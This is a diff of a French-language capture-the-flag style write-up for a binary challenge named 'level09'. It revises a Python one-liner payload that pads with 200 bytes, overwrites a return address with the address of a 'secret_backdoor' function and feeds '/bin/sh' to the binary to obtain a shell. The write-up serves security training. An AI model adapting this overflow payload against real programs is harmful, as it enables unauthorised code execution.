@@ -7,7 +7,7 @@ Ce qui nous permettra de lancer ce qu'il y a dans l'entrée d'user.
 
 On a donc déjà la première partie de l'exploit:
 
-python -c 'print "\xff" * 41 + "\n" + ......'
+python -c 'print "\xff" * 41 + "\n" + ...... + "\n" + "/bin/sh"'
 
 On recherche maintenant l'adresse de la fonction secret_backdoor
 
@@ -47,5 +47,5 @@ On a donc notre offset à 200.
 
 On peut donc terminer notre exploit:
 
-python -c 'print "\xff" * 41 + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00\n/bin/sh"' > /tmp/level09
+python -c 'print "\xff" * 41 + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh"' > /tmp/level09
 cat /tmp/level09 - | ./level09
